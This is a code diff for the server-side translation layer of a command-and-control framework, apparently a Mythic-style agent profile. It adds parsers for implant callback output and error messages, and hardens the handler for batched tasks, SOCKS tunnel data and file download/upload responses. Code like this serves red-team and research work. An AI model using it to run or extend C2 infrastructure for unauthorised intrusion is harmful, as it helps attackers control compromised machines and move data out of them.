@@ -164,48 +164,160 @@ def GetTaskingC2( Data ):
 
     return JsonData
 
+def QuickOut(Data):
+    Psr        = Parser( Data, len(Data) )
+    UUID      = Psr.Pad(36) 
+    CommandID = Psr.Int32()
+
+    JsonData = {
+        "action": "post_response",
+        "responses": []
+    }
+
+    logging.info(f"id {CommandID}")
+
+    if CommandID == 0:
+        CallbackType = Psr.Int32()
+        CallbackOut  = Psr.Bytes().decode("utf-8", errors="ignore")  
+
+        message_types = {
+            KH_CALLBACK_OUTPUT: ("[+] Received Output", "user_output"),
+            KH_CALLBACK_ERROR: ("[x] Received Error", "user_output"),
+        }
+
+        prefix, response_key = message_types.get(CallbackType, ("[?] Received Unknown Callback", "user_output"))
+        Message = f"{prefix}:\n{CallbackOut}"
+
+        Response = {
+            "task_id": UUID.decode("utf-8", errors="ignore"),
+            response_key: Message
+        }
+    else:
+        CallbackType = Psr.Int32()
+        logging.info(f"type {CallbackType}")
+        ProcessOut   = Psr.Bytes()
+        logging.info(f"output length: {len(ProcessOut)}")
+        if callable(ProcessOut):
+            ProcessOut = ProcessOut()
+        
+        if isinstance(ProcessOut, bytes):
+            ProcessOut = ProcessOut.hex()
+
+        Response = {
+            "task_id": UUID.decode("utf-8", errors="ignore"),
+            "process_response": ProcessOut
+        }
+
+    JsonData["responses"].append(Response)
+    return JsonData
+    
+
+def QuickMsg( Data ):
+    Psr = Parser( Data, len( Data ) )
+    UUID         = Psr.Pad( 36 )
+    CallbackType = Psr.Int32()
+    CallbackMsg  = Psr.Str()
+
+    FinalMsg = ""
+    
+    if CallbackType == KH_CALLBACK_ERROR:
+        FinalMsg = f"[x] Received Error:\n{CallbackMsg}"
+    elif CallbackType == KH_CALLBACK_OUTPUT:
+        FinalMsg = f"[+] Received Output:\n{CallbackMsg}"
+    else:
+        FinalMsg = f"[?] Callback type not recognized... (just can be used [CALLBACK_OUTPUT|CALLBACK_ERROR])"
+
+    logging.info(f"MSG =>  with task uuid: {UUID} and callback type: {CallbackType}")
+
+    JsonData = {
+        "action": "post_response",
+        "responses": [
+            {
+                "task_id": UUID.decode("utf-8"),
+                "user_output": FinalMsg
+            }
+        ],
+    }
+
+    logging.info(f":MSG => JSON data: {JsonData}")
+
+    return JsonData
+
 def PostC2(Data):
     Dbg2("------------------------")
     RespTsk = [] 
     RespSck = []
 
-    Psr = Parser(Data, len(Data))
-    Tasks = Psr.Int32()
-    Dbg2(f"Task quantity: {Tasks}")
+    try:
+        Psr = Parser(Data, len(Data))
+        Tasks = Psr.Int32()
+        Dbg2(f"Task quantity: {Tasks}")
 
-    for Task in range(Tasks):
-        TaskLength = Psr.Int32()
-        TaskData   = Psr.Pad(TaskLength)
-        TaskPsr    = Parser(TaskData, TaskLength)
-        
-        TaskUUID = TaskPsr.Bytes().replace(b'\x00', b'')
-        try:
-            TaskUUID = TaskUUID.decode('utf-8')
-        except UnicodeDecodeError:
-            TaskUUID = TaskUUID.hex()
-        
-        CommandID = TaskPsr.Pad(2)
-        CommandID = int.from_bytes(CommandID, byteorder="big")
+        for Task in range(Tasks):
+            try:
+                TaskLength = Psr.Int32()
+                if TaskLength <= 0:
+                    Dbg2(f"Invalid task length: {TaskLength}")
+                    continue
+                    
+                TaskData = Psr.Pad(TaskLength)
+                if len(TaskData) < TaskLength:
+                    Dbg2(f"Incomplete task data, expected {TaskLength} got {len(TaskData)}")
+                    continue
+                    
+                TaskPsr = Parser(TaskData, TaskLength)
+                
+                # Read TaskUUID
+                try:
+                    TaskUUID = TaskPsr.Bytes().replace(b'\x00', b'')
+                    TaskUUID = TaskUUID.decode('utf-8') if TaskUUID else "unknown"
+                except UnicodeDecodeError:
+                    TaskUUID = TaskUUID.hex() if TaskUUID else "unknown"
+                
+                # Read CommandID
+                try:
+                    CommandID = TaskPsr.Pad(2)
+                    CommandID = int.from_bytes(CommandID, byteorder="big") if len(CommandID) == 2 else 0
+                except Exception as e:
+                    CommandID = 0
+                    Dbg2(f"Failed to read CommandID: {str(e)}")
 
-        if CommandID == T_SOCKS:
-            Ext = TaskPsr.Int32()
-            Srv = TaskPsr.Int32()
-            
-            if TaskPsr.buffer is not None:
-                Data = TaskPsr.Bytes()
-                Data = base64.b64encode( Data ).decode( "utf-8" )
-            else:
-                Data = ""
-            
-            SocksData = {
-                "exit": bool(Ext),
-                "server_id": Srv,
-                "data": Data 
-            }
-            RespSck.append(SocksData)
-        else:
-            JsonTsk = process_normal_task(TaskUUID, CommandID, TaskPsr)
-            RespTsk.append(JsonTsk)
+                if CommandID == T_SOCKS:
+                    try:
+                        Ext = TaskPsr.Int32()
+                        Srv = TaskPsr.Int32()
+                        Data = ""
+                        
+                        if not bool(Ext):
+                            try:
+                                Data = TaskPsr.Bytes().decode("utf-8")
+                                Dbg2(f"sending socks encoded: {Data[:50]}... [{len(base64.b64decode(Data))} bytes]")
+                            except Exception as e:
+                                Dbg2(f"Failed to decode socks data: {str(e)}")
+                                Data = ""
+                        
+                        SocksData = {
+                            "exit": bool(Ext),
+                            "server_id": Srv,
+                            "data": Data 
+                        }
+                        RespSck.append(SocksData)
+                    except Exception as e:
+                        Dbg2(f"Failed to process socks task: {str(e)}")
+                else:
+                    try:
+                        JsonTsk = process_normal_task(TaskUUID, CommandID, TaskPsr)
+                        RespTsk.append(JsonTsk)
+                    except Exception as e:
+                        Dbg2(f"Failed to process normal task {TaskUUID}: {str(e)}")
+
+            except Exception as e:
+                Dbg2(f"Error processing task {Task}: {str(e)}")
+                continue
+
+    except Exception as e:
+        Dbg2(f"Fatal error in PostC2: {str(e)}")
+        return {"action": "post_response", "responses": [], "error": str(e)}
 
     JsonData = {
         "action": "post_response",
@@ -215,14 +327,12 @@ def PostC2(Data):
     if RespSck:
         JsonData["socks"] = RespSck
 
-    Dbg2(f"command id: {CommandID}")
-
-    Dbg2(f"JSON data: {JsonData}")
+    Dbg2(f"Processed {len(RespTsk)} tasks and {len(RespSck)} socks")
     Dbg2("------------------------")
     return JsonData
 
 def process_normal_task(TaskUUID, CommandID, TaskPsr:Parser):
-    if CommandID == T_DOWNLOAD:
+    if   CommandID == T_DOWNLOAD:
         return {"task_id": TaskUUID, "download": {...}}
     elif CommandID == T_UPLOAD:
         return {"task_id": TaskUUID, "upload": {...}}
